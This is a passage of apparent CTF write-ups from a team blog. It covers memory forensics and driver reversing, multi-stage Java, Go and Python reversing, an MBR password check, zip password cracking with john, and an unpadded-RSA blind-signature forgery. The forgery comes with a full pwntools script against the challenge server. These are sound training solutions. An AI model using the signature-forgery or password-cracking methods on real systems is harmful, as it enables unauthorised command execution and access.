(/home/fucker/Downloads/volq/20190717.mem) PAE type : No PAE DTB : 0x1ad002L KDBG : 0xf8005b5a3520L Number of Processors : 2 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0xfffff8005a4ee000L KPCR for CPU 1 : 0xffff800121420000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-07-17 23:48:54 UTC+0000 Image local date and time : 2019-07-17 16:48:54 -0700 Volatility suggests 5 profiles, Win10x64_17134 is the most updated so I opted to use that one. This is the part where I got stuck I kept insisting on looking only at processes during the ctf, I used comands like pslist, psxview etc and I found some interesting processes that weren’t listed in pslist : 12345678910$ volatility -f 20190717.mem --profile Win10x64_17134 psxviewVolatility Foundation Volatility Framework 2.6Offset(P) Name PID pslist psscan thrdproc pspcid csrss sessiodn deskthrd ExitTime------------------ -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------... truncated ...0x000000002736c580 dllhost.exe 5024 False True True False True False True ... truncated ...0x0000000070b46a20 32...2 False False False False False False True ... truncate ...0x000000001ff17580 dllhost.exe 240 False True True False False False False As you can see this 3 processes are not shown in pslist one of them doesn’t even have a name or a valid PID, I tried to dump the memory of this 3 but I was not able to do it, for some reason volatility was spiting errors, I also dumped part of the registry too trying to find something useful but that also failed.Much later I decided to view the list of kernel drivers loaded on the system, for this I used the modules command. This command walks the doubly-linked list of LDR_DATA_TABLE_ENTRY structures pointed to PsLoadedModuleList. However this cannot find hidden/unlinked kernel drivers but if this doesn’t work we can also try to do a modscan which serves that purpose. The output of the modules command: 12345678910volatility -f 20190717.mem --profile Win10x64_17134 modulesVolatility Foundation Volatility Framework 2.6Offset(V) Name Base Size File------------------ -------------------- ------------------ ------------------ ----... truncated...0xffffd88ec1e8e010 vmhgfs.sys 0xfffff8005da80000 0x2b000 \\SystemRoot\\system32\\DRIVERS\\vmhgfs.sys0xffffd88ec1fdd8c0 condrv.sys 0xfffff8005dab0000 0x12000 \\SystemRoot\\System32\\drivers\\condrv.sys0xffffd88ec45fb240 WdNisDrv.sys 0xfffff8005dad0000 0x12000 \\SystemRoot\\system32\\drivers\\wd\\WdNisDrv.sys0xffffd88eda5c83d0 Flagostor.sys 0xfffff8005daf0000 0x7000 \\??\\C:\\t4est\\Flagostor.sys0xffffd88ec2981480 RamCaptur...er64.SYS 0xfffff8005db00000 0x7000 \\??\\C:\\Users\\test\\Desktop\\RamCapturer\\x64\\RamCaptureDriver64.SYS We didn’t even ran modscan and we already find two weird drivers that are loaded directly from a strange path C:\\t4est and C:\\test, this isn’t normal, the normal thing to happen is to be loaded from the system32 folder… Obviously RamCaptureDriver64.sys is probably what the creator used to dump this memory, so we are left with flagostor.sys which already has a weird name and also hints for flag after this I used moddump to extract this driver: 12345$ volatility -f 20190717.mem --profile Win10x64_17134 moddump -b 0xfffff8005daf0000 -D .Volatility Foundation Volatility Framework 2.6Module Base Module Name Result------------------ -------------------- ------0xfffff8005daf0000 Flagostor.sys OK: driver.fffff8005daf0000.sys Checking what kind of file: 12$ file driver.fffff8005daf0000.sysdriver.fffff8005daf0000.sys: PE32+ executable (native) x86-64, for MS Windows And this is it, the forensics part is over lets go for the reversing part. Reversing partWe have now a PE executable, I used both IDA and Ghidra, this time Ghidra actually helped me decoding the final part of the decryption function (Pseudo c code was somehow presented better than ida at least from my perspective). I first started analysing with IDA, the main function sub_FFFFF8005DAF1000 which I renamed later to printLoader in the picture below: So lets check the next function: Dumping the global variable (Double click on unk_FFFFF8005DAF3000): Analysing sub_FFFFF8005DAF1440: Since we can convert assembly to pseudo code c in IDA we can easily convert this function into python: Creating a python script for this:123456789101112131415def generate_table(key): table = [] for i in xrange(256): table.append(i) v6 = 0 for j in xrange(256): iVar1 = ord(key[j%len(key)]) + table[j] + v6 v6 = ((iVar1&amp;0xff) + iVar1) - iVar1 # swap aux = table[j] table[j] = table[v6] table[v6] = aux ########## return table The same thing can be done for the decryptFlag function in this case I chose to use GHIDRA which the pseudo code was a bit more understandable for me at least: Once again this could easily be converted to python: 1234567891011121314151617181920212223242526def decrypt_flag(table,flagB): l = len(flagB) flag = [] for x in xrange(l): flag.append('x') local_38 = 0; local_34 = 0; local_28 = 0; local_20 = l; while (local_28 &lt; local_20): local_38 = local_38 + 1 &amp; 0xff local_34 = local_34 + table[local_38] &amp; 0xff # swap aux = table[local_38] table[local_38] = table[local_34] table[local_34] = aux ########## flag[local_28] = table[table[local_38]+table[local_34] &amp; 0xff] ^ ord(flagB[local_28]) local_28 = local_28 + 1; return ''.join([chr(x) for x in flag]) Obviously there was no need to rewrite all of this in python if you manage to run the binary on your computer in my case I wasn’t able to do it in my virtual machine due to some errors that I don’t know, if you could run it you just needed to put a break point in the end and watch the stored values obtaining the flag with ease. The final python script: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849flagB = '\\x2D\\xFB\\x9B\\xA8\\x21\\xF8\\xB0\\xB5\\xFA\\xEC\\x58\\xC5\\xF9\\x35\\x57\\xFA\\xE1\\x62\\x0E\\x19\\x45\\x7D\\x33\\x58\\x6F\\xC9\\x88\\x4F\\x70\\x82'key = 'qweasdzxc'def generate_table(key): table = [] for i in xrange(256): table.append(i) v6 = 0 for j in xrange(256): iVar1 = ord(key[j%len(key)]) + table[j] + v6 v6 = ((iVar1&amp;0xff) + iVar1) - iVar1 # swap aux = table[j] table[j] = table[v6] table[v6] = aux ########## return tabledef decrypt_flag(table,flagB): l = len(flagB) flag = [] for x in xrange(l): flag.append('x') local_38 = 0; local_34 = 0; local_28 = 0; local_20 = l; while (local_28 &lt; local_20): local_38 = local_38 + 1 &amp; 0xff local_34 = local_34 + table[local_38] &amp; 0xff # swap aux = table[local_38] table[local_38] = table[local_34] table[local_34] = aux ########## flag[local_28] = table[table[local_38]+table[local_34] &amp; 0xff] ^ ord(flagB[local_28]) local_28 = local_28 + 1; return ''.join([chr(x) for x in flag])print decrypt_flag(generate_table(key), flagB) Getting the flag: 12$ python hiddenFlag/hidden.py cybrics&#123;H1DD3N_D33P_1N_NTKRNL&#125; The flag was cybrics{H1DD3N_D33P_1N_NTKRNL}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"volatility","slug":"volatility","permalink":"https://teamrocketist.github.io/tags/volatility/"},{"name":"memory","slug":"memory","permalink":"https://teamrocketist.github.io/tags/memory/"},{"name":"ghidra","slug":"ghidra","permalink":"https://teamrocketist.github.io/tags/ghidra/"}]},{"title":"[Reverse] CyBRICS CTF Quals 2019 - Matreshka","slug":"Reverse-CyBRICS-CTF-Quals-2019-Matreshka","date":"2019-07-22T09:29:14.000Z","updated":"2019-07-22T11:39:05.518Z","comments":true,"path":"2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/","link":"","permalink":"https://teamrocketist.github.io/2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/","excerpt":"","text":"Matreshka 50 Description:Matreshka (Reverse, Easy, 50 pts) Author: Khanov Artur (awengar)Matreshka hides flag. Open ithttps://cybrics.net/files/matreshka.zip Decompiling javaAfter unzipping the file we find 2 files one is a .class and an encrypted file. First thing that I did was to decompile the .class file I used this website to do it http://www.decompiler.com12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;class Code2 &#123; public static byte[] decode(byte[] var0, String var1) throws Exception &#123; SecretKeyFactory var2 = SecretKeyFactory.getInstance(\"DES\"); byte[] var3 = var1.getBytes(); DESKeySpec var4 = new DESKeySpec(var3); SecretKey var5 = var2.generateSecret(var4); Cipher var6 = Cipher.getInstance(\"DES\"); var6.init(2, var5); byte[] var7 = var6.doFinal(var0); return var7; &#125; public static byte[] encode(byte[] var0, String var1) throws Exception &#123; SecretKeyFactory var2 = SecretKeyFactory.getInstance(\"DES\"); byte[] var3 = var1.getBytes(); DESKeySpec var4 = new DESKeySpec(var3); SecretKey var5 = var2.generateSecret(var4); Cipher var6 = Cipher.getInstance(\"DES\"); var6.init(1, var5); byte[] var7 = var6.doFinal(var0); return var7; &#125; public static void main(String[] var0) throws Exception &#123; String var1 = \"matreha!\"; byte[] var2 = encode(System.getProperty(\"user.name\").getBytes(), var1); byte[] var3 = new byte[]&#123;76, -99, 37, 75, -68, 10, -52, 10, -5, 9, 92, 1, 99, -94, 105, -18&#125;; for(int var4 = 0; var4 &lt; var3.length; ++var4) &#123; if (var3[var4] != var2[var4]) &#123; System.out.println(\"No\"); return; &#125; &#125; File var9 = new File(\"data.bin\"); FileInputStream var5 = new FileInputStream(var9); byte[] var6 = new byte[(int)var9.length()]; var5.read(var6); var5.close(); byte[] var7 = decode(var6, System.getProperty(\"user.name\")); FileOutputStream var8 = new FileOutputStream(\"stage2.bin\"); var8.write(var7, 0, var7.length); var8.flush(); var8.close(); &#125;&#125; Interpreting the java fileNow that we have some java code I started to analyse the decode and encode functions and we can easily see that the algorithm used for the encryption was DES, the encode function encrypts an array of bytes with a key string, the decode function obviously does the opposite. 12345678910public static byte[] encode(byte[] var0, String var1) throws Exception &#123; SecretKeyFactory var2 = SecretKeyFactory.getInstance(\"DES\"); byte[] var3 = var1.getBytes(); DESKeySpec var4 = new DESKeySpec(var3); SecretKey var5 = var2.generateSecret(var4); Cipher var6 = Cipher.getInstance(\"DES\"); var6.init(1, var5); byte[] var7 = var6.doFinal(var0); return var7; &#125; By looking at the main function we can see the key used to encrypt the file was an username from the machine of the creator of the challenge, we don’t know this username but we do know the result of the encryption of this username and the key used: 12345678910String var1 = \"matreha!\";byte[] var2 = encode(System.getProperty(\"user.name\").getBytes(), var1);byte[] var3 = new byte[]&#123;76, -99, 37, 75, -68, 10, -52, 10, -5, 9, 92, 1, 99, -94, 105, -18&#125;;for(int var4 = 0; var4 &lt; var3.length; ++var4) &#123; if (var3[var4] != var2[var4]) &#123; System.out.println(\"No\"); return; &#125;&#125; We can easily reverse this since we have the key matreha! we can just use the decode function to decrypt the username and use it to decrypt the stage2.bin, I did small modifications to the java file and ended up with this: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;class Code2&#123; public static byte[] decode(byte[] paramArrayOfByte, String paramString) throws Exception &#123; SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"DES\"); byte[] arrayOfByte = paramString.getBytes(); DESKeySpec dESKeySpec = new DESKeySpec(arrayOfByte); SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec); Cipher cipher = Cipher.getInstance(\"DES\"); cipher.init(2, secretKey); return cipher.doFinal(paramArrayOfByte); &#125; public static byte[] encode(byte[] paramArrayOfByte, String paramString) throws Exception &#123; SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"DES\"); byte[] arrayOfByte = paramString.getBytes(); DESKeySpec dESKeySpec = new DESKeySpec(arrayOfByte); SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec); Cipher cipher = Cipher.getInstance(\"DES\"); cipher.init(1, secretKey); return cipher.doFinal(paramArrayOfByte); &#125; public static void main(String[] paramArrayOfString) throws Exception &#123; String str = \"matreha!\"; byte[] arrayOfByte2 = &#123; 76, -99, 37, 75, -68, 10, -52, 10, -5, 9, 92, 1, 99, -94, 105, -18 &#125;; byte[] userName = decode(arrayOfByte2, str); byte[] arrayOfByte1 = encode(userName, str); for (byte b = 0; b &lt; arrayOfByte2.length; b++) &#123; if (arrayOfByte2[b] != arrayOfByte1[b]) &#123; System.out.println(\"No\"); return; &#125; &#125; File file = new File(\"data.bin\"); FileInputStream fileInputStream = new FileInputStream(file); byte[] arrayOfByte3 = new byte[(int)file.length()]; fileInputStream.read(arrayOfByte3); fileInputStream.close(); byte[] arrayOfByte4 = decode(arrayOfByte3, new String(userName)); FileOutputStream fileOutputStream = new FileOutputStream(\"stage2.bin\"); fileOutputStream.write(arrayOfByte4, 0, arrayOfByte4.length); fileOutputStream.flush(); fileOutputStream.close(); &#125;&#125; Now compiling it with javac and running with java commands we get stage2: 1234$ javac wtf.java $ java Code2$ file stage2.bin stage2.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=FBY_TepBaPVEzlo3-SXy/Zsd256T1rd3lPJ9tnxng/YgTlqVI_KVISIMJ6lZi7/tIlG0PXO43MvY1MOVlul, not stripped Stage2 (golang binary)Now we have a 64bit ELF, this a go binary , this one is very similar to the previous challenge but kind of harder to reverse since is go, this time instead of the system username the directory name is used to encrypt the file: Once again after this, a verification of an encrypted folder is done before trying to decrypt the stage3 file: After this I created a folder named abcdefghijklmnopq which has 0x11 (17 in decimal) of size, I inserted a break point at cmp dl, bl and dumped the encrypted string abcdefghijklmnopq and the original encrypted string folder name which is present in the binary. First getting the encrypted bytes of the folder I created:Second get the encrypted bytes of the original folder: We have everything we need to recover the original folder name! Since is xor encryption we just need to get the bytes of the encrypted string abcdefghijklmnopq xor it with the plaintext abcdefghijklmnopq and finally xor with encrypted original name reversing the all thing, I used a python script to do this: 123456a = [0x59,0xCD,0xC9,0x90,0xE9,0x6E,0x9F,0x23,0x4B,0xAF,0x0B,0x33,0xCC,0x39,0x03,0xDB,0xA0]cp =[0x53,0xdd,0xc5,0x87,0xe4,0x63,0x99,0x14,0x4f,0xa4,0x14,0x2d,0xc4,0x24,0x04,0xc0,0xb0]key = ''for i,c in enumerate('abcdefghijklmnopq'): key += chr(ord(c) ^ a[i] ^ cp[i])print key Getting the original folder name 12$ python qwd.py kroshka_matreshka To dump the final file just move the binary to a folder named kroshka_matreshka Stage 3 (python pyc file)This stage is the easiest one we just need to decompile the .pyc with https://pypi.org/project/uncompyle6/ and we end up with this: 12345678910111213141516171819def decode(data, key): idx = 0 res = [] for c in data: res.append(chr(c ^ ord(key[idx]))) idx = (idx + 1) % len(key) return resflag = [ 40, 11, 82, 58, 93, 82, 64, 76, 6, 70, 100, 26, 7, 4, 123, 124, 127, 45, 1, 125, 107, 115, 0, 2, 31, 15]print('Enter key to get flag:')key = input()if len(key) != 8: print('Invalid len') quit()res = decode(flag, key)print(''.join(res)) Once again xor encryption since we already know the first 8 bytes of the flag as “cybrics{“ if we xor this with the first bytes of the encrypted flag we will get the key it’s easy to write a python script for this: 1234567c = [40, 11, 82, 58, 93, 82, 64, 76, 6, 70, 100, 26, 7, 4, 123, 124, 127, 45, 1, 125, 107, 115, 0, 2, 31, 15]x = 0key = ''for i in 'cybrics&#123;': key += chr(ord(i) ^ c[x]) x += 1print key Getting the key 12python roflmao.py Kr0H4137 The key was Kr0H4137, using it to decrypt the flag: 1234$ python3 result.pyEnter key to get flag:Kr0H4137cybrics&#123;M4TR35HK4_15_B35T&#125; The flag was cybrics{M4TR35HK4_15_B35T}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"java","slug":"java","permalink":"https://teamrocketist.github.io/tags/java/"},{"name":"go","slug":"go","permalink":"https://teamrocketist.github.io/tags/go/"}]},{"title":"[Reverse] Midnightsun CTF 2019 - Hfs-mbr","slug":"Reverse-Midnightsun-CTF-2019-Hfs-mbr","date":"2019-04-06T21:22:16.000Z","updated":"2019-04-07T00:19:11.116Z","comments":true,"path":"2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/","link":"","permalink":"https://teamrocketist.github.io/2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/","excerpt":"","text":"Hfs-mbr 213 Description:We made a military-grade secure OS for HFS members. Feel free to beta test it for us!Service: stty -icanon -echo ; nc hfs-os-01.play.midnightsunctf.se 31337 ; stty saneDownload: hfs-os.tar.gz First all I want to thank Midnightsun CTF organizers for such an amazing CTF even that I didn’t have much time to play it due to IRL responsibilities, the few challenges I solved, I learned a lot, it was worth the time invested unlike the time I invested on EncryptCTF where I learned nothing. The most awesome of this is challenge is actually the organizers gave instructions on a README file on how to debug this kind of MBR challenges on ida I always debugged this using gdb which is alot harder to analyse and debug specially when both gef and pwndbg get bugged and stop working leaving you to work on vanilla gdb which is beyond crazy. So after extracting we get a bunch of files: 12$ lsbin/ dos.img hfs-os.tar.gz notes.txt README run* If we read the README we can get some instruction on how to debug on IDA 12345678$ cat READMEHFS-OS./run debug (gdb stub) or ./runHow to debug with IDAIn IDA &gt; Debugger &gt; Attach &gt; Remote debugger (host:1234) &gt; (Debug options &gt; Set specific options, UNCHECK 'software breakpoints at eip+1', CHECK 'use CS:IP in real mode') &gt; OK When attached, Debugger &gt; Manual memory regions &gt; Insert &gt; CHECK 16bit segment &gt; OK In the IDA-View, press G, 0x7c00 is where the bootloader starts. Set a BP &gt; F9 If we check up the contents of run file we can see if we add a debug parameter we can already setup qemu running on a gdb server at port 1234 (default port when not specifically set):12345678$ cat run #! /bin/bashif [ \"$1\" = \"debug\" ] ; then cd bin &amp;&amp; ./qemu-system-i386 -s -S -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=celse cd bin &amp;&amp; ./qemu-system-i386 -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=cfi Configuration IDAYou can skip this chapter if you already know about thsi and you just want to check on my solution to solve the challenge. when opening dos.img change the loading offset to 0x7c00 so ida starts to convert the bytes into assembly form that point: After clicking OK make sure you say no so IDA dissembles it in 16 bit mode: Now we just need to follow the instructions on README file: Select remote gdb debugger: Go to debugger options: Now into set specific options: UNCHECK ‘software breakpoints at eip+1’, CHECK ‘use CS:IP in real mode’ Still on this window click on memory maps: Right click and then insert: Check 16-bit segment and then OK: Go to process options: Set up the hostname to your local ip from your linux machine and change to port to 1234 Solving the problemFirst setup the debugging server but just running:1234$ ./run debugWARNING: Image format was not specified for '../dos.img' and probing guessed raw. Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted. Specify the 'raw' format explicitly to remove the restrictions. Setup a breakpoint on 0x7c00 and start debugging: We can ignore sub_7C0C since is just setting up into video mode if we look up into sub_7C15 (sometimes this bugs out and ida becomes messed up out of the sudden when this happens the only solution I found was to delete IDA database and redo the configuration steps don’t really know why this happens sometimes): After sub7E21 you are going to jump into sub7E06: From the picture above you can see before each call on sub_7E2B if you check on memory for this addresses you will see these are strings of the banner and the message to ask the password for the first part of the challenge: By putting a breaking point on ret and running the binary until it reach you can see it printed the banner: No we jump into loc_7E37: The loose function 0x818a is the address of Wrong password string and sub_7E2B will print it so we want to avoid to jump here: Now interpreting the rest of sub_7E2B The result after jumping: Now if you check the DEADCODE jump after pressing a you can see it after doing its thing it jumps into loc_7FD9: Let’s see what happens if we press e: If we check what happens if we jump to loc_7FCE: Now just do this for every letter and you will end up with a list like this:12345678910111213141516171819202122232425262728a -&gt; deadcodeb -&gt; deadcodec -&gt; deadcoded -&gt; deadcodee -&gt; notdeadcode -&gt; if byte_81BA == 7 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++f -&gt; deadcodeg -&gt; deadcodeh -&gt; deadcodei -&gt; deadcodej -&gt; notdeadcode -&gt; if byte_81BA == 2 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++k -&gt; deadcodel -&gt; deadcodem -&gt; deadcoden -&gt; notdeadcode -&gt; if byte_81BA == 6 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++o -&gt; notdeadcode -&gt; if byte_81BA == 1 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++p -&gt; notdeadcode -&gt; if byte_81BA == 4 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++q -&gt; deadcoder -&gt; notdeadcode -&gt; if byte_81BA == 8 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++s -&gt; notdeadcode -&gt; if byte_81BA == 0 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++t -&gt; deadcodeu -&gt; notdeadcode -&gt; if byte_81BA == 3 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++v -&gt; deadcodew -&gt; notdeadcode -&gt; if byte_81BA == 5 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++x -&gt; deadcodey -&gt; deadcodez -&gt; deadcodedeadcode -&gt; byte_81BA++ The calculations done to calculate the indexes: 12345678910111213141516$ python -c \"print 0x73 ^ 0x73\" # s0$ python -c \"print (0x8e-(0x20))^0x6f\" # o1$ python -c \"print (0x38 + 0x30) ^ 0x6a\" # j2$ python -c \"print (0x88-(5*4))^0x70\" # p4$ python -c \"print (0x82 - 0x10)^0x77\" # w5$ python -c \"print 0x6e ^ 0x68\" # n6$ python -c \"print (0x2 + 0x60)^0x65\" # e7$ python -c \"print (0xac-(0x52-0x20))^0x72\" # r8 The password was sojupwner Getting the flag:12345678910111213[HFS SECURE BOOT] Loading ....-. .-.----.----. .-. .-.----..----. | &#123;_&#125; | &#123;_&#123; &#123;__ | `.' | &#123;&#125; | &#123;&#125; &#125; | &#123; &#125; | | .-._&#125; &#125; | |\\ /| | &#123;&#125; | .-. \\ `-' `-`-' `----' `-' ` `-`----'`-' `-' Enter the correct password to unlock the Operating System[HFS_MBR]&gt; sojupwner....[HFS SECURE SHELL] Here is your flag for HFS-MBR: midnight&#123;w0ah_Sh!t_jU5t_g0t_REALmode&#125; [HFS SECURE SHELL] loaded at 100f:0100 (0x101f0) and ready for some binary carnage! The flag was HFS-MBR: midnight{w0ah_Sh!t_jU5t_g0t_REALmode}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"},{"name":"mbr","slug":"mbr","permalink":"https://teamrocketist.github.io/tags/mbr/"}]},{"title":"[Misc] EncryptCTF - crack-jack","slug":"Misc-EncryptCTF-crack-jack","date":"2019-04-05T16:04:06.000Z","updated":"2019-04-05T16:15:50.452Z","comments":true,"path":"2019/04/05/Misc-EncryptCTF-crack-jack/","link":"","permalink":"https://teamrocketist.github.io/2019/04/05/Misc-EncryptCTF-crack-jack/","excerpt":"","text":"crack-jack 50 Description:Visuals are Deceptive So… Visuals are Deceptive… I guess not only the visuals are deceptive :’)We are publishing this write-up only to show how such an easy problem, that barely has no value compared to the other challenges (50pts), due to the excessive guessing component, can be tricky enough to be only solved by 11 teams out of 696 Let’s get into it.Firstly, we are presented with this image Classic image with a bs flag in it. Surely this flag won’t do anything. We could try to use some steganography tools, but since other problems were meant to be solved using them, lets keep them as our last resort. Let’s binwalk it. After using binwalk it is possible to see that there is a zip archive inside. Let’s extract everything using binwalk -e to automatically extract known file types that exist inside the flag.png file. Displaying everything that is inside the folder we see that exists, besides the zip file, a file named flag.txt. No way it is the real flag. cat‘ed and nothing as expected. Let’s check the zip. unzipwon’t do because it is password protected. What’s inside? A flag.txt inside the password-protected zip? It must be it. The challenge has crack on its name. Let’s crack it! Usually it this cases I use zip2john to get hashed passwords out of the zip archives and then brute-force them using john and a common wordlist ( e.g. rockyou.txt ) Oh well…. No password hashes lef to crack and none was cracked… Usually if rockyou doesn’t work it has to be with some sort of information related to the challenge itself… Hello Guessing Part. Are you there?What can we try? Hmm… this was my line of thought: 1-FAIL: Metadata? - used exiftool on both the zip file and on the initial flag.png. Nahhhh nothing interesting. 2-FAIL: First Image Text? - well, flag.png has some text, such as “ENCRYPT CTF 2019”, “encryptCTF{N0t__7h@7_345y}”, etc… Did a script to use those strings plus the individual words of each string, etc, etc. Guess what? Nothing… 3-CORRECT: Visuals are Deceiving - “what if the visuals (point 2) of an image are there to just deceive us and behind everything we see isn’t the true reality? earth being round or flat doesn’t mean anything because that’s just our visual perception of it and it’s deceiving the true form of it! Nothing that we see can be trusted” - said the author of this challenges when was creating it while tripping out. Don’t get me wrong, I’m just kidding and hope you don’t get offended, but this is a clear representation of my initial statement. A supposedly easy challenge that doesn’t value that much (50pts) that deceives us into trying over and over basic stuff and losing a lot of time because if it is easy it should be done quickly and we are not expecting to be trying to lose time guessing random stuff. Getting back to the solution. Since Visuals are Deceiving. what really matters from that initial flag.png isn’t the image itself but the text of the file. This can be obtained using strings. Getting this text, you can create a wordlist based on it and use it to crack the hash of the zip Bingo! The password is: G^WBC[WLr3. Let’s unzip and view the content of the flag.txt file. There you go. That’s how we did it. Hope we don’t get trash guessing challenges like this ever again… The flag was encryptCTF{C4acK!ng_7h3_Uncr4ck4bl3}","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"encryptCTF","slug":"encryptCTF","permalink":"https://teamrocketist.github.io/tags/encryptCTF/"},{"name":"zip","slug":"zip","permalink":"https://teamrocketist.github.io/tags/zip/"},{"name":"jtr","slug":"jtr","permalink":"https://teamrocketist.github.io/tags/jtr/"},{"name":"zip2john","slug":"zip2john","permalink":"https://teamrocketist.github.io/tags/zip2john/"},{"name":"binwalk","slug":"binwalk","permalink":"https://teamrocketist.github.io/tags/binwalk/"},{"name":"guessing","slug":"guessing","permalink":"https://teamrocketist.github.io/tags/guessing/"}]},{"title":"[Crypto] VolgaCtf2019 - Blind","slug":"Crypto-VolgaCtf2019-Blind","date":"2019-04-01T00:16:26.000Z","updated":"2019-04-08T21:51:53.352Z","comments":true,"path":"2019/04/01/Crypto-VolgaCtf2019-Blind/","link":"","permalink":"https://teamrocketist.github.io/2019/04/01/Crypto-VolgaCtf2019-Blind/","excerpt":"","text":"Blind 200 Description:Pull the flag…if you can.nc blind.q.2019.volgactf.ru 7070server.py Identifying the problemThe server has a set of commands which a client can use, the commands cat and cd to be executed need to be signed by the servers private key, we don’t have access to that key, but we can sign anything besides the commands cat and cd, looking at the code we can see the server is signing our message directly with unpadded RSA, knowing this we can use RSA’s malleability property to forge a signature. Applying the attackThe signing is done by simply doing: Where: m is the message d is the rsa private exponent n is the modulus We know that RSA is homomorphic to the multiplication this means for example that this is true: To get the flag we need to use the command cat and do something like cat flag to obtain it, so since we can’t do it directly we gotta find an r that modifies our message so it modifies our message to something different than cat , we can then use this property of rsa to forge a signature by nullifying the first division with a multiplication. For example we first sign our message m divided by an r number like this: Now we can just sign the number r: Now we can obtain the final signature we wanted by just multiplying both signatures: Hence resuming what I showed you in the pictures we can trivially divide our challenge by a number r (provided it is in itself considered valid for signing and the challenge is a multiple of it), say 2, sign it and sign the quotient separately, multiply them and apply modular reduction with the public key’s modulus and hence forge the signature. Avoiding some problems encountered because of this particular challengeBecause this challenge is using some specific libraries to parse the commands the output of our sign m/r and r can’t contain for example spaces or quote characters otherwise the server will throw an error when using shlex.split(message), the spaces because it’s going to split into multiple commands and the server will only sign part of the command, and the quotes really throws errors if they aren’t closed or escaped so I wrote an function find a valid r: 1234567891011# Lazy way to find a valid r valuefor x in xrange(r_,99999999999): try: m = safe_unhexlify(M/x) t = shlex.split(m) b = len(t) == 1 except ValueError: # some characters like quotes and shit can fuck up the signing because of shlex.split continue if(M % x == 0 and b): r_ = x break The valid r ended up being the number 408479, the full code to this challenge is: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *from binascii import unhexlify,hexlifyimport base64import shleximport reN = 26507591511689883990023896389022361811173033984051016489514421457013639621509962613332324662222154683066173937658495362448733162728817642341239457485221865493926211958117034923747221236176204216845182311004742474549095130306550623190917480615151093941494688906907516349433681015204941620716162038586590895058816430264415335805881575305773073358135217732591500750773744464142282514963376379623449776844046465746330691788777566563856886778143019387464133144867446731438967247646981498812182658347753229511846953659235528803754112114516623201792727787856347729085966824435377279429992530935232902223909659507613583396967e = 65537def safe_unhexlify(n): if len(\"%x\" % n) % 2 != 0: m = unhexlify(\"0\"+(\"%x\" % n)) else: m = unhexlify(\"%x\" % n) return m def sign(message, dont_skip=True): if (dont_skip): print r.recvuntil(\"Enter your command:\\r\\n\") r.sendline(\"sign \"+\"sign\") r.sendline(base64.b64encode(message)) return re.findall(r'\\d+',r.recvuntil(\"Enter your command:\\r\\n\"))[0]def cat(signature, command): r.sendline(str(signature) + \" \" + command) print r.recv()r_ = 2r = remote('blind.q.2019.volgactf.ru',7070)M = int(hexlify(\"cat flag\"), 16)# Lazy way to find a valid r valuefor x in xrange(r_,99999999999): try: m = safe_unhexlify(M/x) t = shlex.split(m) b = len(t) == 1 except ValueError: # some characters like quotes and shit can fuck up the signing because of shlex.split continue if(M % x == 0 and b): r_ = x breakprint \"r=%d and M=%d\" % (r_,M)mBlinded = sign(m) # M / r_sBlinded = sign(safe_unhexlify(r_), False)S = (int(mBlinded) * int(sBlinded)) % Ncat(S,\"cat flag\")r.close() Now running it and obtaining the flag: 12345678$ python blind.py[+] Opening connection to blind.q.2019.volgactf.ru on port 7070: Doner=408479 and M=7161132565001953639Enter your command:VolgaCTF&#123;B1ind_y0ur_tru3_int3nti0n5&#125;[*] Closed connection to blind.q.2019.volgactf.ru port 7070","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"},{"name":"homomorphic","slug":"homomorphic","permalink":"https://teamrocketist.github.io/tags/homomorphic/"},{"name":"blindSignatures","slug":"blindSignatures","permalink":"https://teamrocketist.github.io/tags/blindSignatures/"},{"name":"volgactf2019","slug":"volgactf2019","permalink":"https://teamrocketist.github.io/tags/volgactf2019/"}]},{"title":"[Crypto] VolgaCtf2019 - 